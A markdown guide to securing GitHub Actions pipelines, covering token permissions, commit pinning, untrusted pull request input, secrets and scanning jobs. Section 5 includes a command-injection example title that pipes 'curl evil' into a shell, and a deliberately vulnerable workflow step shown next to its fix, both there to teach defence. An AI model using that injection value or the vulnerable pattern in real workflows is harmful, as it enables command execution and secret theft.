# Pipeline security: permissions, actions, untrusted input, secrets and the security jobs

This file is for everyone who writes or changes a workflow, people and AI agents alike. A pipeline
holds the keys to the code, the registry and production, so its definition is production code.
The file says which permissions a job gets, how third-party actions are pinned, how a workflow
keeps code from a pull request away from its secrets, why a secret never goes into a repository,
private ones included, and what the security jobs check and when. The rules hold for every
workflow; the image job's own security rules are [images.md](../docker/images.md) sections 5,
9 and 10, and the deploy credentials are [delivery.md](delivery.md) section 5.

**Navigation**

- [1. Purpose and the one rule](#1-purpose-and-the-one-rule)
- [2. What an attacker gets from a pipeline](#2-what-an-attacker-gets-from-a-pipeline)
- [3. Token permissions](#3-token-permissions)
- [4. Third-party actions: pin by commit](#4-third-party-actions-pin-by-commit)
- [5. Untrusted input: pull requests, triggers, caches, runners](#5-untrusted-input-pull-requests-triggers-caches-runners)
- [6. Secrets: never in a repository, private ones included](#6-secrets-never-in-a-repository-private-ones-included)
- [7. The security jobs](#7-the-security-jobs)
- [8. Workflow files are reviewed like production code](#8-workflow-files-are-reviewed-like-production-code)
- [9. Common mistakes](#9-common-mistakes)
- [10. Where the rules stop holding](#10-where-the-rules-stop-holding)
- [11. Alternatives considered](#11-alternatives-considered)
- [12. Sources](#12-sources)

## 1. Purpose and the one rule

One rule holds the rest together: **give every job only the access its commands use, run no code
you did not review next to a credential, and keep every secret out of the repository.**

OWASP's Top 10 CI/CD Security Risks (version 1.0, 2022, still the current list) names the risks
this file covers [1]:

| OWASP risk | Where the rule is |
|---|---|
| CICD-SEC-1 Insufficient flow control | [pipeline.md](pipeline.md) section 6 (the required check), [delivery.md](delivery.md) section 4 (the production gate), this file's section 8 |
| CICD-SEC-2 Inadequate identity and access management | section 3; [delivery.md](delivery.md) section 5 |
| CICD-SEC-3 Dependency chain abuse | section 4; section 7; [security.md](../../react/security/security.md) section 10 for npm and pnpm |
| CICD-SEC-4 Poisoned pipeline execution | section 5; section 8 |
| CICD-SEC-5 Insufficient pipeline-based access controls | section 3; [pipeline.md](pipeline.md) section 3 |
| CICD-SEC-6 Insufficient credential hygiene | section 6; [delivery.md](delivery.md) section 5 |
| CICD-SEC-7 Insecure system configuration | section 5 (runners) |
| CICD-SEC-8 Ungoverned use of third-party services | section 4 |
| CICD-SEC-9 Improper artifact integrity validation | [delivery.md](delivery.md) section 3; [images.md](../docker/images.md) section 9 |
| CICD-SEC-10 Insufficient logging and visibility | not covered yet: this practice found no rule with a source it could cite |

## 2. What an attacker gets from a pipeline

Workflows are written with weak settings at scale, and attackers use them. In 447,238 workflows
collected up to July 2021, Koishybayev et al. found that "99.8% of workflows are overprivileged",
under GitHub's old read-write default [2]. Muralee et al. scanned 2.78 million workflows and
confirmed code injection in 5,298 of the 5,643 they checked by hand [3]. In a 2025 sample of 382
workflows, Abrokwah and Ghaleb found commit pins in 6.3% and no `permissions` block in 71.2%
(a preprint) [4].

The attacks that followed took exactly these openings:

- **Moved tags.** The tags of `tj-actions/changed-files` (March 2025) were moved to a commit that
  printed the runner's secrets into the logs [5]; in March 2026, 76 of the 77 tags of Trivy's
  own `trivy-action` were moved to a credential stealer [6]. A workflow pinned to a commit ran
  the code it was reviewed with.
- **`pull_request_target` and a shared cache.** At TanStack (May 2026) an attacker combined "the
  pull_request_target "Pwn Request" pattern, GitHub Actions cache poisoning across the fork↔base
  trust boundary, and runtime memory extraction of an OIDC token" and published 84 malicious
  package versions [7].
- **A leftover token.** At Ultralytics (December 2024), the second wave of malicious releases came
  from "an unrevoked PyPI API token that was still available to the GitHub Actions workflow" after
  the move to trusted publishing [8].

## 3. Token permissions

- **Set `permissions: {}` at the top of every workflow, and give each job a `permissions:` block
  with only what its steps use.** GitHub calls it "good security practice to set the default
  permission for the `GITHUB_TOKEN` to read access only for repository contents" [9]; a job that
  lists one permission gets `none` for every permission it does not list [10]. Organisations
  created before February 2023 may still give every token write access by default [11], so a
  workflow that sets nothing inherits whatever the organisation set.
- **Grant `id-token: write` only to a job that logs in to a cloud with OIDC**, and only on events
  that deploy ([delivery.md](delivery.md) section 5). The permission lets the job request an OIDC
  token, and nothing more [12].
- **Check out with `persist-credentials: false`**, so the token the checkout uses is not left on
  the runner for the steps after it [13].

## 4. Third-party actions: pin by commit

- **Pin every action that is not in your own repository to a full 40-character commit SHA, with
  its release in a comment.** GitHub: "Pin references to actions to a commit SHA in your workflow
  files", because "a tag can be moved or deleted if a bad actor gains access to the repository
  storing the action" [9]. The incidents of section 2 are the cost of a tag. This rule covers every
  workflow; [images.md](../docker/images.md) section 10 states it for the job that pushes images.
- **Let a bot move the action pins: Renovate or Dependabot version updates.** Pinned actions get
  no Dependabot alerts: "Dependabot only creates alerts for vulnerable actions that use semantic
  versioning and will not create alerts for actions pinned to SHA values" [9]. Without a bot, a pin
  freezes a version with a known hole. The docker practice's `renovate.json` turns on
  `helpers:pinGitHubActionDigests` ([dockerfile-example.md](../docker/dockerfile-example.md)
  section 5), which moves the action pins; it does not move a tool a step downloads in `run:` or
  a scanner's `version:` input, so the examples name who moves those by hand and when.
- **Make sure a SHA belongs to the action's repository, not to a fork.** Chainguard describes
  impostor commits, "commits that appear to be from a parent repository, but they actually belong
  to a fork", which GitHub serves through the parent's name [14]; GitHub asks you to check that a
  SHA "is from the action's repository and not a repository fork" [9]. The `impostor-commit` audit
  of zizmor checks it (section 7) [15].
- **Where you administer the organisation, turn on the allowed-actions policy that requires
  pins.** "The policy will check for a full commit SHA, and any workflow that attempts to use an
  action that isn't pinned will fail" [16]. It is a check that cannot cry wolf.
- **Use fewer actions.** A step of three shell lines needs no third-party action, and every action
  is code that runs with the job's token. GitHub's own `actions/*` and the tool vendors' own
  actions (`astral-sh/setup-uv`, `aws-actions/*`) carry less risk than a single person's action.

Two newer features do not replace the pin today. Immutable releases protect the tags of new
releases, but "Existing releases remain mutable unless you republish them" [17], and you cannot see
from a workflow whether an action's maintainers turned them on. Workflow dependency lockfiles, in
public preview since 2026-10-14, record "the exact commits you locked", including the actions an
action calls [18], and GitHub's secure-use page calls a lockfile "the strongest protection
available" that "supersedes SHA pinning for repositories that adopt it" [9]. So keep the SHA pins
today, add a lockfile on top of them if you want its extra cover, and drop the pins only after
GitHub marks lockfiles generally available. Check this paragraph again when GitHub marks lockfiles
generally available.

## 5. Untrusted input: pull requests, triggers, caches, runners

- **Pass every value an outsider can write, such as a pull request title, a branch name or a
  `workflow_dispatch` input, into a script through `env:`, never with `${{ }}` inside `run:`.** The
  expression is pasted into the script before the shell runs it, so a title such as
  ``"; curl evil | sh #`` becomes a command. GitHub calls the intermediate environment variable
  "the preferred approach to handling untrusted input" in inline scripts [9].

  Bad, the title pasted into the script:

  ```yaml
  - run: echo "Checking ${{ github.event.pull_request.title }}"
  ```

  The title is code here. The fixed step reads it as data:

  ```yaml
  - env:
      TITLE: ${{ github.event.pull_request.title }}  # data in a variable, never pasted into the script
    run: echo "Checking $TITLE"
  ```

- **Never check out or run a pull request's code in a `pull_request_target` or `workflow_run`
  workflow.** Those workflows "are privileged, which means they share the same cache of the main
  branch with other privileged workflow triggers, and may have repository write access and access
  to referenced secrets" [9]. Since 2026-06-18, `actions/checkout` v7 "refuses to fetch fork pull
  request code" in them unless you opt out [19], and from 2026-11-02 a default rule disables
  `pull_request_target` in public repositories that set no policy of their own [20]. Use
  `pull_request` for anything that runs the pull request's code.
- **Never let a workflow that runs code from outside write the cache that a publishing or
  deploying workflow reads.** TanStack's attacker saved a poisoned pnpm store under `main`'s cache
  scope, where the release workflow would restore it [7]. Since 2026-06-26 GitHub gives untrusted
  triggers a read-only cache [21]; keep the deploy's own caches keyed to `main` and to the lockfile
  ([pipeline.md](pipeline.md) section 8).
- **Run pull requests from forks only on runners GitHub hosts, or on self-hosted runners that are
  wiped after each job.** GitHub: "self-hosted runners should almost never be used for public
  repositories" [9]. Stawinski and Khan reached PyTorch's release infrastructure through a
  persistent self-hosted runner and advise: "If workflows from fork-PRs are necessary,
  organizations should only use GitHub-hosted runners" [22].

## 6. Secrets: never in a repository, private ones included

- **Never commit a secret in plain text to any repository, a private one included.** A private
  repository protects a secret only as long as every account that can read it, every clone, every
  fork and every CI log stays safe.

  Why a private repository is not safe:

  - At Uber in 2016, the Federal Trade Commission's complaint says the key "was in plain text in
    code that was posted to a private GitHub repository", and that the intruders reached it "using
    passwords that were previously exposed in other large data breaches" [23].
  - A commit outlives its deletion: Truffle Security showed that data from "deleted forks, deleted
    repositories and even private repositories on GitHub" stays reachable [24], and Meli et al.,
    who watched secrets leaked to public GitHub, found that only 19% were gone after 16 days and
    that no repository they monitored had its history rewritten [25].
  - The Twelve-Factor App's test applies to any repository: could the code "be made open source at
    any moment, without compromising any credentials" [26].
- **Keep each secret where its consumer reads it, never in the repository:**

  | Who reads it | Where it lives |
  |---|---|
  | a deploy job | nowhere: OIDC gives it short-lived credentials ([delivery.md](delivery.md) section 5) |
  | a CI job that any run may use it in, such as a read-only token that lifts a pull limit | a repository secret |
  | a job that may use it only after an environment's rules pass | an environment secret ([delivery.md](delivery.md) section 4) |
  | the running service | the cloud's secret store, referenced by the deployment ([delivery.md](delivery.md) section 5) |
  | a developer's machine | a `.env` file that git ignores, read by the settings class ([python.md](../../python/language/python.md) section 5); the repository holds `.env.example` with names and no values ([file-structure.md](../file-structure/file-structure.md) section 9) |
  | the frontend | nobody: a value in the bundle is public ([security.md](../../react/security/security.md) section 9) |
  | an image build | a build secret, never a build argument ([images.md](../docker/images.md) section 5) |

- **Store one value per secret, never a JSON or YAML blob, and never print one.** Redaction in the
  logs "largely relies on finding an exact match", so GitHub says "do not use a blob of JSON, XML,
  or YAML (or similar) to encapsulate a secret value"; and since "automatic redaction is not
  guaranteed", a step that prints a secret can leak it [9].
- **Stop a secret before it leaves the machine, block it at the push where the plan allows, and
  scan in CI as the last net.** Run a secret scanner as a pre-commit hook; turn on push protection
  for the repository, which "Is disabled by default" [27]; and scan the commits of every pull
  request in CI (section 7). On GitHub Free, push protection and secret scanning cover public
  repositories only; private repositories need GitHub Secret Protection, at USD 19 per active
  committer per month [28]. The pre-commit hook and the CI scan work on every plan.
- **When a secret leaks, rotate it: revoke the leaked value at its provider first, so it stops
  working, then issue a new value and store it where the table above says.** Revoking alone
  breaks the job or the service that reads the secret, and a new value put in the repository is a
  new leak. [git.md](../git/git.md) section 6 owns what happens next in git; a history rewrite is
  cleanup, never removal.
  - **A secret printed in a run log is a leak too: rotate it and delete the log.** GitHub: "If an
    unredacted secret is sent to a workflow run log, you should delete the log and rotate the
    secret" [9].
  - **After the revocation, read the provider's audit log from the time of the commit to the
    revocation**, to see whether someone used the secret while it was readable.
  - **Then clear the CI finding: add its fingerprint to `.gitleaksignore`, under a comment line that
    names the key and the date it was revoked.** gitleaks scans every commit of the pull request,
    so the finding stays after the line is deleted; its README says to "Add this fingerprint to the
    `.gitleaksignore` file to ignore that specific secret" [40]. `CODEOWNERS` sends that file to
    the pipeline owners (section 8).
- **An encrypted secret in the repository is an exception, not a default.** OWASP accepts it only
  when "developers cannot decrypt the secrets themselves" and each environment has its own key
  [29]. The tools have costs: a leaked Sealed Secrets key exposes every secret ever sealed with it,
  and "No amount of sealing key rotation in the cluster or even re-encryption of existing
  SealedSecrets files can change that" [30]; git-crypt "does not support revoking access" [31].
  Thoughtworks uses SOPS for the case "it's impossible to remove secrets from legacy code
  repositories" [32].

## 7. The security jobs

Run the security checks as jobs of their own, so their permissions stay small.

- **Let CI's gate need the security jobs, so no merge and no deploy skips them.** CI calls the
  security workflow through `workflow_call`, and its one gate job needs that call
  ([pipeline.md](pipeline.md) section 6); the deploy workflow calls CI on `main` and the security
  workflow again on a version tag. A job that fails on a finding, as the workflow linters, the
  dependency scan and the secret scan do, then blocks the merge, the publish on `main` and the
  production deploy, so a new advisory against the workflows or the lockfiles stops the release.
  CodeQL's job stays green when it finds an alert: its `analyze` step has no input that fails the
  job on one [45], and zizmor-action's README gives the reason: "Advanced Security encourages
  workflows to only fail on internal errors" [46]. So on `main` and on a version tag CodeQL
  records alerts and gates nothing, and on a pull request an alert blocks only through the
  ruleset rule below.
- **Make every change to the workflows and to the scanners' config and ignore files need a code
  owner's review (section 8).** Without that review, a pull request can edit those files and switch
  its own scan off, and the gate above still passes.

| Check | Tool | When | Why this tool |
|---|---|---|---|
| Workflow linters | actionlint and zizmor | every CI run (pull request, queue, `main`, weekly); the push of a version tag, before production | actionlint checks syntax, expressions and the shell in `run:` [33]; zizmor checks security: unpinned actions, excessive permissions, template injection, dangerous triggers, cache poisoning, impostor commits [15]. Fares et al. found that no single scanner covers every class of weakness in workflows (a preprint) [34], so run both |
| Dependencies | osv-scanner over `uv.lock` and `pnpm-lock.yaml` | every CI run; the push of a version tag, before production | one scanner reads both lockfiles of the monorepo [35]; pip-audit does not read `uv.lock` [36], and `uv audit` is still a preview feature [37]. GitHub's dependency review action is the other choice where the plan includes it: on a private repository it needs GitHub Advanced Security [38] |
| Code | CodeQL for `python`, `javascript-typescript` and `actions` | every CI run, and the push of a version tag; outside a pull request it records alerts only | GitHub's analyser; free on public repositories, on private ones it needs GitHub Code Security, USD 30 per active committer per month [28], [39] |
| Secrets | gitleaks over the commits of the pull request | every pull request | the CI net under the pre-commit hook (section 6); gitleaks now takes "security patches only", and its maintainer works on Betterleaks [40]: re-check the choice before you adopt it |
| Secrets in the bundle | gitleaks over the built frontend bundle | in the frontend job, after the build | most front-end credentials show only in the compiled bundle ([security.md](../../react/security/security.md) section 9) |
| Image | the scanner of [images.md](../docker/images.md) section 10 | in the image job, and on the pushed digest ([delivery.md](delivery.md) section 3); the digest each environment runs, continuously (the last bullet of this section) | owned there |

A redeploy of an earlier version runs none of these jobs, so the way back is not held up by a new
advisory ([delivery.md](delivery.md) section 7).

- **Write down what fails the build, scan with one scanner per kind, and waive a finding only with
  a reason and an expiry date.** Scanners disagree: Imtiaz et al. found that tools reported between
  17 and 332 vulnerable dependencies for the same Maven projects [41]. A pass means "no finding
  under this policy", never "no vulnerability". The waiver file's form is
  [images.md](../docker/images.md) section 10's; the frontend's audit policy is
  [security.md](../../react/security/security.md) section 10's.
- **Give the security jobs read-only permissions and no secrets, and keep them out of the deploy
  jobs.** A scanner is third-party code: Trivy's own action shipped a credential stealer in March
  2026 [6]. CodeQL is the exception that writes: it needs `security-events: write` to upload its
  results [39]. A scanner inside the image job runs with that job's token and follows
  [images.md](../docker/images.md) section 10; this rule covers the security jobs.
- **Make code scanning alerts block a merge with the ruleset's code scanning rule.** A CodeQL
  finding becomes a code scanning alert, and whether an alert blocks a merge is set by that rule,
  which works apart from the required status checks [43]; the required check alone only says the
  scan ran. The rule has two limits: it "will not apply to" merge queue groups, and "all the lines
  of code identified by an alert must exist in the pull request diff" [43], so an alert on a line
  the pull request did not change blocks nothing. The git practice's
  [ruleset-example.md](../git/ruleset-example.md) shows the rule.
- **Run the scans weekly as well, and name who reads the result.** A new advisory turns an
  unchanged lockfile red; a scheduled run catches it between changes ([pipeline.md](pipeline.md)
  section 4 has the schedule's limits).
- **Rescan the digest each environment runs, on a schedule or continuously, and name who reads the
  findings.**
  Production runs the digest of the last version tag, which can be older than `main`'s, so the
  weekly scan of `main`'s image does not cover it; [docker/ci-example.md](../docker/ci-example.md)
  asks the same. On AWS the smallest form needs no workflow job: turn on ECR's enhanced scanning
  with continuous scanning for the repository, and Amazon Inspector scans an image again
  "Whenever Amazon Inspector adds a new common vulnerabilities and exposures (CVE) item to its
  database, and that CVE is relevant to that container image" [48]. By default it keeps watching
  an image that an ECS task used in the last 14 days [48]. Amazon Inspector charges for the scans
  [49]. This adds a second image scanner, a departure from "one scanner per kind" above, taken
  because it needs no job. Its cost: Amazon Inspector runs outside the workflow, so it watches and
  never gates a build; its findings can differ from those of the image job's scanner, Trivy in the
  examples, because scanners disagree ([images.md](../docker/images.md) section 10); and a waiver
  in `.trivyignore` does not reach it. Treat each finding it reports for a running digest as a
  gate's finding: fix it through `main` and the next version tag
  ([delivery.md](delivery.md) section 4), or waive it with a suppression rule on that
  vulnerability ID and repository, with its reason in the rule's `reason` field [50], [51]. A
  suppression rule has no expiry date of its own [51], so write the date into the reason and
  delete the rule on that date.

## 8. Workflow files are reviewed like production code

- **List the pipeline's files in `CODEOWNERS`, so a change to them asks for the review of the
  people who own the pipeline**: `.github/`, the deploy files, and the files that tell a scanner
  what to skip, because a pull request that edits them could switch off its own scan. GitHub: "You
  can use the `CODEOWNERS` feature to control how changes are made to your workflow files" [9].
  Where two or more people review, set three rules of the branch ruleset:
  `required_approving_review_count` to 1 or more, `require_code_owner_review` to `true` and
  `require_last_push_approval` to `true` ([ruleset-example.md](../git/ruleset-example.md), "What
  to change for your repository", says what each does); [security-example.md](security-example.md)
  section 3 shows the file.
- **Read a workflow change for what it can reach**: a new trigger, a new permission, a new action,
  a `${{ }}` inside `run:`. Those four lines decide what an attacker could do with the workflow.

## 9. Common mistakes

| Mistake | What it costs | Fix |
|---|---|---|
| No `permissions:` block | the job may hold a write token by the organisation's default | section 3 |
| An action pinned to a tag | a moved tag runs someone else's code with your token | section 4 |
| `${{ github.event.pull_request.title }}` inside `run:` | a pull request title becomes a command | section 5 |
| `pull_request_target` with a checkout of the pull request | fork code runs with your secrets | section 5 |
| A secret in a private repository | every reader, clone, fork and log holds it, for good | section 6 |
| A JSON blob as one secret | redaction misses parts of it in the logs | section 6 |
| A scanner job with write permissions and secrets | a compromised scanner reaches production | section 7 |
| The old static key kept after the move to OIDC | the attacker uses the key OIDC was meant to retire | [delivery.md](delivery.md) section 5 |

## 10. Where the rules stop holding

- **A plan without push protection or code scanning for private repositories**: run the open
  tools of section 7 and the pre-commit hook; the rules hold, the GitHub features do not.
- **A repository that accepts no pull requests from forks**: section 5's fork rules matter less,
  but the injection rule still holds for branch names and for `workflow_dispatch` inputs.
- **Self-hosted runners for private repositories only**: still wipe them after each job, because
  a job can leave a process or a file for the next one [22].

## 11. Alternatives considered

- **Tags instead of SHA pins, for readability.** Rejected: the incidents of section 2 moved tags.
  The version comment keeps the readability.
- **The workflow lockfile instead of pins.** The stronger form once it is generally available;
  today GitHub writes that lockfiles "are in public preview and subject to change" [44].
- **OpenSSF Scorecard as the workflow checker.** Its checks overlap zizmor's on workflows, and its
  action needs GitHub Advanced Security on private repositories [42].
- **GitHub's own scanners only.** Fine where the plan includes them; on other plans the open tools
  of section 7 do the same jobs.
- **A step that fails the CodeQL job on open alerts.** A last step that lists the ref's open alerts
  through the code scanning API, which filters by ref, state and severity [47], and fails on a
  critical or high one would make CodeQL gate a tag deploy too. Not shown in the examples.
- **Encrypted secrets in the repository as the default.** Rejected, section 6: decryption keys and
  revocation become the problem the secret store already solves.

## 12. Sources

Checked 2026-10-18 unless a line ends with — checked <YYYY-MM-DD>.

- [1] OWASP — Top 10 CI/CD Security Risks, v1.0 — https://owasp.org/www-project-top-10-ci-cd-security-risks/
- [2] Igibek Koishybayev et al. — Characterizing the Security of Github CI Workflows (USENIX Security, 2022; research) — https://www.usenix.org/system/files/sec22-koishybayev.pdf
- [3] Siddharth Muralee et al. — ARGUS: A Framework for Staged Static Taint Analysis of GitHub Workflows and Actions (USENIX Security, 2023; research) — https://www.usenix.org/system/files/usenixsecurity23-muralee.pdf
- [4] Edward Abrokwah and Taher A. Ghaleb — An Empirical Study of Complexity, Heterogeneity, and Compliance of GitHub Actions Workflows (arXiv, 2025; research) — https://arxiv.org/abs/2507.18062
- [5] GitHub Advisory Database — GHSA-mrrh-fwg8-r2c3, tj-actions/changed-files (CVE-2025-30066) — https://github.com/advisories/GHSA-mrrh-fwg8-r2c3
- [6] Aqua Security — GHSA-69fq-xp46-6x23, Trivy supply chain compromise (CVE-2026-33634) — https://github.com/aquasecurity/trivy/security/advisories/GHSA-69fq-xp46-6x23
- [7] TanStack — npm supply-chain compromise post-mortem (tanstack.com, 2026; case) — https://tanstack.com/blog/npm-supply-chain-compromise-postmortem
- [8] Seth Larson — Supply-chain attack analysis: Ultralytics (PyPI blog, 2024; case) — https://blog.pypi.org/posts/2024-12-11-ultralytics-attack-analysis/
- [9] GitHub — Secure use reference — https://docs.github.com/en/actions/reference/security/secure-use
- [10] GitHub — Workflow syntax for GitHub Actions: permissions — https://docs.github.com/en/actions/reference/workflows-and-actions/workflow-syntax#permissions
- [11] GitHub — Updating the default GITHUB_TOKEN permissions to read-only (changelog, 2023-02-02) — https://github.blog/changelog/2023-02-02-github-actions-updating-the-default-github_token-permissions-to-read-only/
- [12] GitHub — OpenID Connect reference — https://docs.github.com/en/actions/reference/security/oidc
- [13] GitHub — actions/checkout, README, v7.0.1 — https://github.com/actions/checkout/blob/v7.0.1/README.md
- [14] Chainguard — What the fork? Imposter commits in GitHub Actions and CI/CD (chainguard.dev, 2023; research) — https://www.chainguard.dev/unchained/what-the-fork-imposter-commits-in-github-actions-and-ci-cd
- [15] zizmor — Audit rules, zizmor 1.31.1 — https://docs.zizmor.sh/audits/
- [16] GitHub — Actions policy now supports blocking and SHA pinning actions (changelog, 2025-08-15) — https://github.blog/changelog/2025-08-15-github-actions-policy-now-supports-blocking-and-sha-pinning-actions/
- [17] GitHub — Immutable releases are now generally available (changelog, 2025-10-28) — https://github.blog/changelog/2025-10-28-immutable-releases-are-now-generally-available/
- [18] GitHub — Workflow lockfiles in public preview (changelog, 2026-10-14) — https://github.blog/changelog/2026-10-14-github-actions-workflow-lockfiles-in-public-preview/
- [19] GitHub — Safer pull_request_target defaults for actions/checkout (changelog, 2026-06-18) — https://github.blog/changelog/2026-06-18-safer-pull_request_target-defaults-for-github-actions-checkout/
- [20] GitHub — Workflow execution protections in GitHub Actions generally available (changelog, 2026-09-17) — https://github.blog/changelog/2026-09-17-workflow-execution-protections-in-github-actions-generally-available/
- [21] GitHub — Read-only Actions cache for untrusted triggers (changelog, 2026-06-26) — https://github.blog/changelog/2026-06-26-read-only-actions-cache-for-untrusted-triggers/
- [22] John Stawinski — Playing with Fire: How We Executed a Critical Supply Chain Attack on PyTorch (johnstawinski.com, 2024; case) — https://johnstawinski.com/2024/01/11/playing-with-fire-how-we-executed-a-critical-supply-chain-attack-on-pytorch/
- [23] Federal Trade Commission — In the Matter of Uber Technologies, Inc., revised complaint, C-4662, October 2018 — https://www.ftc.gov/system/files/documents/cases/152_3054_c-4662_uber_technologies_revised_complaint.pdf
- [24] Joe Leon — Anyone can Access Deleted and Private Repository Data on GitHub (Truffle Security, 2024; research, sponsored by Truffle Security) — https://trufflesecurity.com/blog/anyone-can-access-deleted-and-private-repo-data-github
- [25] Michael Meli, Matthew R. McNiece and Bradley Reaves — How Bad Can It Git? Characterizing Secret Leakage in Public GitHub Repositories (NDSS, 2019; research) — https://www.ndss-symposium.org/wp-content/uploads/2019/02/ndss2019_04B-3_Meli_paper.pdf
- [26] Adam Wiggins — The Twelve-Factor App: III. Config (12factor.net, 2017; opinion) — https://12factor.net/config
- [27] GitHub — About push protection — https://docs.github.com/en/code-security/concepts/secret-security/push-protection
- [28] GitHub — Security plans and pricing — https://github.com/security/plans
- [29] OWASP Cheat Sheet Series — Secrets Management Cheat Sheet — https://cheatsheetseries.owasp.org/cheatsheets/Secrets_Management_Cheat_Sheet.html
- [30] Bitnami — Sealed Secrets, README — https://github.com/bitnami-labs/sealed-secrets
- [31] Andrew Ayer — git-crypt, README — https://github.com/AGWA/git-crypt
- [32] Thoughtworks — Technology Radar: SOPS (thoughtworks.com, 2024; opinion) — https://www.thoughtworks.com/en-us/radar/tools/sops
- [33] rhysd — actionlint, README, v1.7.12 — https://github.com/rhysd/actionlint/blob/v1.7.12/README.md
- [34] Madjda Fares, Yogya Gamage and Benoit Baudry — Unpacking Security Scanners for GitHub Actions Workflows (arXiv, 2026; research) — https://arxiv.org/abs/2601.14455
- [35] Google — OSV-Scanner: supported languages and lockfiles, v2.7.0 — https://google.github.io/osv-scanner/supported-languages-and-lockfiles/
- [36] PyPA — pip-audit, README — https://github.com/pypa/pip-audit
- [37] Astral — uv: Preview features, uv 0.13.1 — https://docs.astral.sh/uv/concepts/preview/
- [38] GitHub — actions/dependency-review-action, README — https://github.com/actions/dependency-review-action
- [39] GitHub — github/codeql-action, README, v4.39.0 — https://github.com/github/codeql-action/blob/v4.39.0/README.md
- [40] Zachary Rice — gitleaks, README — https://github.com/gitleaks/gitleaks
- [41] Nasif Imtiaz, Seaver Thorne and Laurie Williams — A Comparative Study of Vulnerability Reporting by Software Composition Analysis Tools (ESEM, 2021; research) — https://arxiv.org/abs/2108.12078
- [42] OpenSSF — scorecard-action, README — https://github.com/ossf/scorecard-action
- [43] GitHub — Code scanning merge protection — https://docs.github.com/en/code-security/concepts/code-scanning/merge-protection
- [44] GitHub — Workflow dependency lockfiles — https://docs.github.com/en/actions/concepts/security/workflow-dependency-lockfiles
- [45] GitHub — github/codeql-action, `analyze/action.yml` (the step's inputs), v4.39.0 — https://github.com/github/codeql-action/blob/v4.39.0/analyze/action.yml
- [46] zizmor — zizmor-action, README, v0.7.1 — https://github.com/zizmorcore/zizmor-action/blob/v0.7.1/README.md
- [47] GitHub — REST API endpoints for code scanning: list code scanning alerts for a repository — https://docs.github.com/en/rest/code-scanning/code-scanning
- [48] AWS — Amazon Inspector User Guide: Scanning Amazon ECR container images with Amazon Inspector — https://docs.aws.amazon.com/inspector/latest/user/scanning-ecr.html
- [49] AWS — Amazon ECR User Guide: Scan images for OS and programming language package vulnerabilities in Amazon ECR — https://docs.aws.amazon.com/AmazonECR/latest/userguide/image-scanning-enhanced.html
- [50] AWS — Amazon Inspector User Guide: Suppressing Amazon Inspector findings — https://docs.aws.amazon.com/inspector/latest/user/findings-managing-supression-rules.html
- [51] AWS — Amazon Inspector API Reference: CreateFilter — https://docs.aws.amazon.com/inspector/v2/APIReference/API_CreateFilter.html
